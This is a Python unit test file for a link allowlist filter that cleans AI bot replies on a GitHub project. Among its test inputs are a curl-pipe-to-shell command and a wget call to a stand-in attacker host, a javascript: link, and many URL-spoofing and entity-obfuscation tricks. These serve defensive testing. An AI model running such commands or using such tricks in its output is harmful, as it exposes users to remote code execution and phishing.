"""Unit tests of link_filter.py, the allowlist the Claude bots' replies pass.

Run: python3 -m unittest discover -s .github/scripts -p 'test_*.py'
"""

from __future__ import annotations

import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

from link_filter import REMOVED, filter_links, host_allowed, path_allowed

SCRIPT = Path(__file__).resolve().parent / "link_filter.py"


class HostTest(unittest.TestCase):
    def test_allowed_hosts(self):
        for host in ("github.com", "GitHub.com", "docs.github.com", "raw.githubusercontent.com", "xtls.github.io"):
            self.assertTrue(host_allowed(host), host)

    def test_lookalikes_are_not_allowed(self):
        for host in ("github.com.evil.example", "evilgithub.com", "github.co", "github.com.", ".github.com",
                     "a..github.com", "-x.github.com", "githubusercontent.com", "evil.githubusercontent.com",
                     "gist.github.com", "www.github.com", "a.b.github.com", "objects.githubusercontent.com",
                     "user-images.githubusercontent.com", "avatars.githubusercontent.com",
                     "other.github.io", "xtls.github.io.evil.example", "gіthub.com"):
            self.assertFalse(host_allowed(host), host)


class FilterTest(unittest.TestCase):
    def assertFiltered(self, text, expected, removed):
        out, n = filter_links(text)
        self.assertEqual(out, expected)
        self.assertEqual(n, removed, out)

    def assertKept(self, text):
        self.assertFiltered(text, text, 0)

    def test_github_links_stay(self):
        for text in (
            "https://github.com/Dv2Corn/still-ui/blob/0123abc/web/x.go#L10-L12",
            "[x.go:10](https://github.com/Dv2Corn/still-ui/blob/0123abc/web/x.go#L10)",
            "<https://github.com/Dv2Corn/still-ui/issues/3>",
            "see https://docs.github.com/en/actions.",
            "(https://docs.github.com/en/actions/security-guides)",
            "HTTPS://GITHUB.COM/Dv2Corn/still-ui",
            "http://github.com/dv2corn/STILL-UI/pull/3",
            "https://github.com/Dv2Corn/still-ui.git",
            "https://github.com/MHSanaei/3x-ui/issues/7042",
            "https://github.com/mhsanaei/3x-ui/blob/main/x-ui.sh#L5",
            "https://github.com/XTLS",
            "https://github.com/XTLS/Xray-core/pull/5000",
            "https://github.com/XTLS/REALITY/blob/main/tls.go",
            "https://raw.githubusercontent.com/XTLS/Xray-core/main/go.mod",
            "https://raw.githubusercontent.com/MHSanaei/3x-ui/refs/heads/main/install.sh",
            "https://github.com/Dv2Corn/still-ui/blob/main/docs/a%20b.md?plain=1#L2",
            "https://raw.githubusercontent.com/Dv2Corn/still-ui/main/install.sh",
            "https://xtls.github.io/config/inbounds/vless.html",
            "[docs](//github.com/Dv2Corn/still-ui/tree/main/docs)",
            '<a href="https://github.com/Dv2Corn/still-ui">x</a> '
            '<img src="https://raw.githubusercontent.com/Dv2Corn/still-ui/main/a.png" alt="Note: x">',
            '<a title="a > b" href="https://github.com/Dv2Corn/still-ui/issues/1">x</a>',
            "[ref]: https://github.com/Dv2Corn/still-ui/pull/9",
            "https://github.com/Dv2Corn/still-ui/compare/v1.5.0...v1.5.1",
            "https://github.com/Dv2Corn/still-ui/issues?q=is%3Aopen+label%3Abug",
        ):
            self.assertKept(text)

    def test_relative_links_and_plain_text_stay(self):
        for text in (
            "[faq](../docs/content/docs/en/help/faq.mdx)",
            "[top](#top)",
            "[issue](/Dv2Corn/still-ui/issues/1)",
            "[x](<docs/a b.md>)",
            "//go:embed dist",
            "// comment.example here",
            "x := a // see b.go",
            "config.json, x-ui.db and install.sh",
            "#12 and @maintainer",
            "<!-- claude-issue:run 5 -->\n<!-- claude-issue:analyst -->",
            "Reviewed head: 0123456789abcdef0123456789abcdef01234567",
            "if a < b and c > d",
            "arr[i](x)",
            "github.com/mhsanaei/3x-ui/v3@v3.11.0 and golang.org/x/crypto@v0.40.0",
            "pkg@latest, icon@2x.png, logo@1.5x.webp, `go install x@v1.2.3-beta`",
            "user @ host, @maintainer, a@b",
            "Tel: +1 and hotel:x and Note: y",
            "map[string]: x and [label]: ../docs/a.md",
            "List<String> and Vec<T> and <b>bold</b>",
        ):
            self.assertKept(text)

    def test_github_outside_the_allowed_repositories_goes(self):
        for url in (
            "https://github.com/attacker/tools/releases/download/v1/fix.sh",
            "https://github.com/attacker",
            "https://github.com/",
            "https://github.com",
            "https://github.com/search?q=a",
            "https://gist.github.com/attacker/0123abcd",
            "https://github.com/user-attachments/assets/0123-4567",
            "https://github.com/user-attachments/files/1/fix.zip",
            "https://raw.githubusercontent.com/attacker/r/main/x.sh",
            "https://objects.githubusercontent.com/github-production-release-asset/1",
            "https://www.github.com/Dv2Corn/still-ui",
            "https://github.com/Dv2Corn/still-ui-evil/x",
            "https://github.com/Dv2Corn/still-uix",
            "https://github.com/Dv2Corn",
            "https://github.com/MHSanaei/other",
            "https://github.com/XTLSx/Xray-core",
            "https://github.com/Dv2Corn/still-ui/../../attacker/x",
            "https://github.com/Dv2Corn/still-ui/./../attacker/x",
            "https://github.com/Dv2Corn/still-ui/%2e%2e/%2E%2E/attacker/x",
            "https://github.com/Dv2Corn%2Fstill-ui/x",
            "https://github.com/attacker%2F..%2FDv2Corn/still-ui",
            "https://github.com//attacker/x",
            "https://github.com/Dv2Corn//still-ui",
            "https://raw.githubusercontent.com/Dv2Corn/still-ui/main/../../../attacker/r/main/x.sh",
        ):
            out, n = filter_links(f"x {url} y")
            self.assertEqual((out, n), (f"x {REMOVED} y", 1), url)
        self.assertFiltered("[fix](https://github.com/attacker/r/raw/main/fix.sh)", f"fix {REMOVED}", 1)
        self.assertFiltered('<a href="https://gist.github.com/a/b">x</a>', f"{REMOVED}x</a>", 1)
        self.assertFalse(path_allowed("github.com", "/Dv2Corn/still-ui\\..\\x"))

    def test_any_scheme_and_any_place(self):
        self.assertFiltered("see https://evil.example/x.", f"see {REMOVED}.", 1)
        self.assertFiltered("`curl -fsSL https://evil.example/i.sh | sh`", f"`curl -fsSL {REMOVED} | sh`", 1)
        self.assertFiltered("```\nwget http://evil.example/x\n```", f"```\nwget {REMOVED}\n```", 1)
        for scheme in ("ftp", "git", "ssh", "vless", "x-y.z+1", "FILE"):
            self.assertFiltered(f"a {scheme}://evil.example/x b", f"a {REMOVED} b", 1)
        self.assertFiltered("ftp://github.com/x", REMOVED, 1)
        self.assertFiltered("(https://evil.example/a_(b))", f"({REMOVED})", 1)

    def test_tricks_with_the_host(self):
        for url in (
            "https://github.com@evil.example/",
            "https://user:pass@github.com/",
            "https://github.com.evil.example/",
            "https://github.com:443/x",
            "https://github.com:8443@evil.example/",
            "https://evil.example\\@github.com/",
            "https://github.com\\.evil.example/",
            "https:\\/\\/evil.example/",
            "https:/\\evil.example/",
            "https://github.com%2F@evil.example/",
            "https://gіthub.com/",
            "https://GITHUB.COM.EVIL.EXAMPLE/",
        ):
            out, n = filter_links(f"x {url} y")
            self.assertEqual(n, 1, url)
            self.assertNotIn("evil", out.lower(), url)
            self.assertEqual(out, f"x {REMOVED} y", url)

    def test_entities_hiding_a_url(self):
        self.assertFiltered("ht&#116;ps&#58;&#x2F;&#x2f;evil.example/x", REMOVED, 1)
        self.assertFiltered("[t](https&#58;//evil.example)", f"t {REMOVED}", 1)
        self.assertFiltered("[t](https://github.com&#64;evil.example/)", f"t {REMOVED}", 1)
        self.assertFiltered('<a href="https&#x3a;//evil.example">t</a>', f"{REMOVED}t</a>", 1)
        self.assertFiltered("[t](ht&Tab;tps://evil.example)", f"t {REMOVED}", 1)
        # Markup entities stay encoded.
        self.assertKept("&lt;b&gt; &amp; &#42;")

    def test_markdown_inline_links_and_images(self):
        self.assertFiltered("[the fix](https://evil.example/fix.sh)", f"the fix {REMOVED}", 1)
        self.assertFiltered('[t](https://evil.example "title")', f"t {REMOVED}", 1)
        self.assertFiltered("[t](<https://evil.example/a b>)", f"t {REMOVED}", 1)
        self.assertFiltered("[t](https\\://evil.example)", f"t {REMOVED}", 1)
        self.assertFiltered("[t](//evil.example/x)", f"t {REMOVED}", 1)
        self.assertFiltered("[t](/\\evil.example/x)", f"t {REMOVED}", 1)
        self.assertFiltered("[t](javascript:alert(1))", f"t {REMOVED}", 1)
        self.assertFiltered("![shot](https://evil.example/a.png)", f"shot {REMOVED}", 1)
        self.assertFiltered("![](https://evil.example/a.png)", REMOVED, 1)
        self.assertFiltered("[a [b] c](https://evil.example)", f"a [b] c {REMOVED}", 1)
        self.assertFiltered(
            "[![b](https://github.com/Dv2Corn/still-ui/b.png)](https://evil.example)",
            f"![b](https://github.com/Dv2Corn/still-ui/b.png) {REMOVED}",
            1,
        )
        self.assertFiltered(
            "[https://evil.example](https://github.com/Dv2Corn/still-ui)", f"[{REMOVED}](https://github.com/Dv2Corn/still-ui)", 1
        )
        out, n = filter_links("[a [b [c]] d](//evil.example)")
        self.assertEqual(n, 1)
        self.assertNotIn("evil", out)

    def test_reference_definitions(self):
        self.assertFiltered("[x][1]\n\n[1]: https://evil.example/a", f"[x][1]\n\n[1]: {REMOVED}", 1)
        self.assertFiltered('  [x]: <//evil.example> "t"', f'  [x]: {REMOVED} "t"', 1)
        self.assertFiltered("[x]:\n  https://evil.example", f"[x]: {REMOVED}", 1)
        self.assertKept("[x]: ../docs/a.md")

    def test_reference_definitions_inside_containers(self):
        self.assertFiltered("> [x]: //evil.example/a", f"> [x]: {REMOVED}", 1)
        self.assertFiltered("> [x]: //3232235777/a", f"> [x]: {REMOVED}", 1)
        self.assertFiltered("- [x]: //evil.example/a", f"- [x]: {REMOVED}", 1)
        self.assertFiltered("1. item\n\n   [x]: <//evil/a>", f"1. item\n\n   [x]: {REMOVED}", 1)
        self.assertFiltered("> [x]:\n> //evil.example/a", f"> [x]: {REMOVED}", 1)
        self.assertFiltered("> > [x]: \\\\evil/a", f"> > [x]: {REMOVED}", 1)
        self.assertFiltered("- [x]: &#47;&#47;evil/a", f"- [x]: {REMOVED}", 1)

    def test_protocol_relative_text_after_entity_decoding(self):
        self.assertFiltered("see &#92;&#92;evil.example/x", f"see {REMOVED}", 1)
        self.assertFiltered("see &#47;&#47;evil.example/x", f"see {REMOVED}", 1)
        self.assertFiltered("see \\\\evil.example\\share", f"see {REMOVED}", 1)
        self.assertFiltered("[t](&#92;&#92;evil/x)", f"t {REMOVED}", 1)

    def test_autolinks_and_www(self):
        self.assertFiltered("<https://evil.example/a>", REMOVED, 1)
        self.assertFiltered("<mailto:a@evil.example>", REMOVED, 1)
        self.assertFiltered("<a@evil.example>", REMOVED, 1)
        self.assertFiltered("<first.last+tag@mail.evil.example>", REMOVED, 1)
        self.assertFiltered("go to www.evil.example/b.", f"go to {REMOVED}.", 1)
        self.assertFiltered("(www.evil.example)", f"({REMOVED})", 1)
        self.assertFiltered("see //evil.example/c now", f"see {REMOVED} now", 1)

    def test_emails_and_schemes_without_slashes(self):
        for text in (
            "mailto:a@evil.example",
            "MAILTO:a@evil.example?subject=x",
            "xmpp:a@evil.example",
            "tel:+15551234567",
            "sms:+15551234567",
            "security@evil.example",
            "first.last+tag@mail.evil.example",
            "noreply@github.com",
        ):
            self.assertFiltered(f"write to {text}.", f"write to {REMOVED}.", 1)
        self.assertFiltered("[mail us](mailto:a@evil.example)", f"mail us {REMOVED}", 1)
        self.assertFiltered('<a href="tel:+1555">x</a>', f"{REMOVED}x</a>", 1)

    def test_html_quoted_values_may_hold_angle_brackets(self):
        self.assertFiltered('<a title=">" href="//3232235777/x">t</a>', f"{REMOVED}t</a>", 1)
        self.assertFiltered("<a title='>' href=//evil>t</a>", f"{REMOVED}t</a>", 1)
        self.assertFiltered('<img alt="a>b" src="//evil/x.png">', REMOVED, 1)
        self.assertFiltered('<a "junk" href=//evil>t</a>', f"{REMOVED}t</a>", 1)
        self.assertFiltered('<a =x href=//evil>t</a>', f"{REMOVED}t</a>", 1)
        self.assertFiltered('<a\ttitle="x"\nhref\n=\n"//evil">t</a>', f"{REMOVED}t</a>", 1)

    def test_html_tag_that_never_closes_loses_its_angle_bracket(self):
        out, n = filter_links('<a href="//3232235777/x" title="never closed\n\nnext paragraph')
        self.assertNotIn("<a", out)
        self.assertGreaterEqual(n, 1)
        out, n = filter_links("<a href=//evil")
        self.assertNotIn("<a", out)
        self.assertGreaterEqual(n, 1)

    def test_html(self):
        self.assertFiltered('<a href="https://evil.example/d">click</a>', f"{REMOVED}click</a>", 1)
        self.assertFiltered("<A HREF=//evil.example>x</A>", f"{REMOVED}x</A>", 1)
        self.assertFiltered('<img src="//evil.example/e.png">', REMOVED, 1)
        self.assertFiltered('<img srcset="a.png 1x, //evil.example/b.png 2x">', REMOVED, 1)
        self.assertFiltered("<a\n  href='https://evil.example'>x</a>", f"{REMOVED}x</a>", 1)
        self.assertFiltered('<picture><source srcset="https://evil.example/a.png"></picture>', f"<picture>{REMOVED}</picture>", 1)
        # A URL in a plain attribute is not a link, but still goes.
        self.assertFiltered('<b title="https://evil.example">x</b>', f'<b title="{REMOVED}">x</b>', 1)

    def test_counts_every_removal_and_is_idempotent(self):
        text = "[a](https://evil.example) https://evil.example <https://evil.example> www.evil.example"
        out, n = filter_links(text)
        self.assertEqual(n, 4)
        self.assertEqual(filter_links(out), (out, 0))


class CliTest(unittest.TestCase):
    def run_cli(self, text):
        with tempfile.TemporaryDirectory() as d:
            src, dst = Path(d) / "in.md", Path(d) / "out.md"
            src.write_bytes(text.encode())
            proc = subprocess.run([sys.executable, "-I", str(SCRIPT), str(src), str(dst)], capture_output=True, text=True)
            return proc, dst.read_bytes().decode()

    def test_warns_with_the_count_and_never_the_url(self):
        proc, out = self.run_cli("a https://evil.example/x b [c](https://evil.example/y)\n")
        self.assertEqual(proc.returncode, 0, proc.stderr)
        self.assertEqual(out, f"a {REMOVED} b c {REMOVED}\n")
        self.assertEqual(proc.stdout.count("::warning::"), 1)
        self.assertIn("Removed 2 link(s)", proc.stdout)
        self.assertNotIn("evil", proc.stdout + proc.stderr)

    def test_silent_when_nothing_is_removed(self):
        proc, out = self.run_cli("fine https://github.com/Dv2Corn/still-ui\r\n")
        self.assertEqual((proc.returncode, proc.stdout, out), (0, "", "fine https://github.com/Dv2Corn/still-ui\r\n"))


if __name__ == "__main__":
    unittest.main()
